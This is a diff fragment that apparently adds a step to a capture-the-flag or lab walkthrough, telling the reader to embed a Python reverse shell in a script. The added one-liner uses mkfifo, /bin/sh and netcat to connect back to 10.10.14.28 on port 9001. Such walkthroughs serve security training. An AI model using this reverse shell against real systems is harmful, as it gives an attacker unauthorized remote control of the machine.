@@ -44,5 +44,11 @@
 ![image](https://user-images.githubusercontent.com/83878909/229810365-f5c26d85-6436-48f8-818b-948ec5db7de2.png)
   - Executing the script now sends an ICMP request.
 ![image](https://user-images.githubusercontent.com/83878909/229810078-4f602a4e-a411-4154-9e97-0509a2f1ab9a.png)
+  - Modify the script and embed a python reverse shell.
+```CSS
+"__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.28 9001 >/tmp/f')"
+```
+![image](https://user-images.githubusercontent.com/83878909/229831739-157a6b8e-0edf-454f-92d6-afa0de1550c7.png)
+
 
 
